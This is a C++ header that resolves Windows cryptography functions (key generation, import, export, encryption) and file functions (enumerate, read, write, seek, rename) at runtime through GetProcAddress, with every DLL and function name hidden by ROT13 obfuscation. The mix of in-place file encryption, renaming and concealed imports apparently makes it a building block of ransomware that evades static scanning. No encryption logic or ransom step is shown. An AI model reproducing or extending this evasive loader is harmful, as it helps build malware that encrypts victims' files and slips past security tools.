#pragma once

#include "Utils.h"

#include <string>
#include <windows.h>

namespace Libs {
typedef BOOL(__stdcall* AcquireContextPtr)(
    HCRYPTPROV* phProv,
    LPCWSTR szContainer,
    LPCWSTR szProvider,
    DWORD dwProvType,
    DWORD dwFlags);

typedef BOOL(__stdcall* ReleaseContextPtr)(
    HCRYPTPROV hProv,
    DWORD dwFlags);

typedef BOOL(__stdcall* CreateHashPtr)(
    HCRYPTPROV hProv,
    ALG_ID Algid,
    HCRYPTKEY hKey,
    DWORD dwFlags,
    HCRYPTHASH* phHash);

typedef BOOL(__stdcall* HashDataPtr)(
    HCRYPTHASH hHash,
    const BYTE* pbData,
    DWORD dwDataLen,
    DWORD dwFlags);

typedef BOOL(__stdcall* DeriveKeyPtr)(
    HCRYPTPROV hProv,
    ALG_ID Algid,
    HCRYPTHASH hBaseData,
    DWORD dwFlags,
    HCRYPTKEY* phKey);

typedef BOOL(__stdcall* EncryptPtr)(
    HCRYPTKEY hKey,
    HCRYPTHASH hHash,
    BOOL Final,
    DWORD dwFlags,
    BYTE* pbData,
    DWORD* pdwDataLen,
    DWORD dwBufLen);

typedef BOOL(__stdcall* DestroyHashPtr)(
    HCRYPTHASH hHash);

typedef BOOL(__stdcall* GenKeyPtr)(
    HCRYPTPROV hProv,
    ALG_ID Algid,
    DWORD dwFlags,
    HCRYPTKEY* phKey);

typedef BOOL(__stdcall* DestroyKeyPtr)(
    HCRYPTKEY hKey);

typedef BOOL(__stdcall* ImportKeyPtr)(
    HCRYPTPROV hProv,
    const BYTE* pbData,
    DWORD dwDataLen,
    HCRYPTKEY hPubKey,
    DWORD dwFlags,
    HCRYPTKEY* phKey);

typedef BOOL(__stdcall* ExportKeyPtr)(
    HCRYPTKEY hKey,
    HCRYPTKEY hExpKey,
    DWORD dwBlobType,
    DWORD dwFlags,
    BYTE* pbData,
    DWORD* pdwDataLen);

HMODULE handle = LoadLibraryA(deobfuscateString("Nqincv32").c_str());

auto AcquireContext = (AcquireContextPtr)GetProcAddress(handle, deobfuscateString("PelcgNpdhverPbagrkgJ").c_str());
auto ReleaseContext = (ReleaseContextPtr)GetProcAddress(handle, deobfuscateString("PelcgEryrnfrPbagrkg").c_str());

auto CreateHash = (CreateHashPtr)GetProcAddress(handle, deobfuscateString("PelcgPerngrUnfu").c_str());
auto HashData = (HashDataPtr)GetProcAddress(handle, deobfuscateString("PelcgUnfuQngn").c_str());
auto DestroyHash = (DestroyHashPtr)GetProcAddress(handle, deobfuscateString("PelcgQrfgeblUnfu").c_str());

auto GenKey = (GenKeyPtr)GetProcAddress(handle, deobfuscateString("PelcgTraXrl").c_str());
auto DeriveKey = (DeriveKeyPtr)GetProcAddress(handle, deobfuscateString("PelcgQrevirXrl").c_str());
auto DestroyKey = (DestroyKeyPtr)GetProcAddress(handle, deobfuscateString("PelcgQrfgeblXrl").c_str());
auto ImportKey = (ImportKeyPtr)GetProcAddress(handle, deobfuscateString("PelcgVzcbegXrl").c_str());
auto ExportKey = (ExportKeyPtr)GetProcAddress(handle, deobfuscateString("PelcgRkcbegXrl").c_str());

auto Encrypt = (EncryptPtr)GetProcAddress(handle, deobfuscateString("PelcgRapelcg").c_str());

typedef HANDLE(__stdcall* FindFirstFileWPtr)(
    LPCWSTR lpFileName,
    LPWIN32_FIND_DATAW lpFindFileData);

typedef BOOL(__stdcall* FindNextFileWPtr)(
    HANDLE hFindFile,
    LPWIN32_FIND_DATAW lpFindFileData);

typedef BOOL(__stdcall* FindClosePtr)(
    HANDLE hFindFile);

typedef HANDLE(__stdcall* CreateFileWPtr)(
    LPCWSTR lpFileName,
    DWORD dwDesiredAccess,
    DWORD dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    DWORD dwCreationDisposition,
    DWORD dwFlagsAndAttributes,
    HANDLE hTemplateFile);

typedef BOOL(__stdcall* GetFileSizePtr)(
    HANDLE hFile,
    LPDWORD lpFileSizeHigh);

typedef BOOL(__stdcall* ReadFilePtr)(
    HANDLE hFile,
    LPVOID lpBuffer,
    DWORD nNumberOfBytesToRead,
    LPDWORD lpNumberOfBytesRead,
    LPOVERLAPPED lpOverlapped);

typedef BOOL(__stdcall* CloseHandlePtr)(
    HANDLE hObject);

typedef BOOL(__stdcall* WriteFilePtr)(
    HANDLE hFile,
    LPCVOID lpBuffer,
    DWORD nNumberOfBytesToWrite,
    LPDWORD lpNumberOfBytesWritten,
    LPOVERLAPPED lpOverlapped);

typedef BOOL(__stdcall* MoveFileWPtr)(
    LPCWSTR lpExistingFileName,
    LPCWSTR lpNewFileName);

typedef DWORD(__stdcall* SetFilePointerPtr)(
    HANDLE hFile,
    LONG lDistanceToMove,
    PLONG lpDistanceToMoveHigh,
    DWORD dwMoveMethod);

HMODULE handleK32 = LoadLibraryA(deobfuscateString("Xreary32").c_str());

auto FindFirstFileW = (FindFirstFileWPtr)GetProcAddress(handleK32, deobfuscateString("SvaqSvefgSvyrJ").c_str());
auto FindNextFileW = (FindNextFileWPtr)GetProcAddress(handleK32, deobfuscateString("SvaqArkgSvyrJ").c_str());
auto FindClose = (FindClosePtr)GetProcAddress(handleK32, deobfuscateString("SvaqPybfr").c_str());

auto CreateFileW = (CreateFileWPtr)GetProcAddress(handleK32, deobfuscateString("PerngrSvyrJ").c_str());
auto GetFileSize = (GetFileSizePtr)GetProcAddress(handleK32, deobfuscateString("TrgSvyrFvmr").c_str());
auto ReadFile = (ReadFilePtr)GetProcAddress(handleK32, deobfuscateString("ErnqSvyr").c_str());
auto WriteFile = (WriteFilePtr)GetProcAddress(handleK32, deobfuscateString("JevgrSvyr").c_str());
auto CloseHandle = (CloseHandlePtr)GetProcAddress(handleK32, deobfuscateString("PybfrUnaqyr").c_str());

auto MoveFileW = (MoveFileWPtr)GetProcAddress(handleK32, deobfuscateString("ZbirSvyrJ").c_str());
auto SetFilePointer = (SetFilePointerPtr)GetProcAddress(handleK32, deobfuscateString("FrgSvyrCbvagre").c_str());
};  // namespace Libs
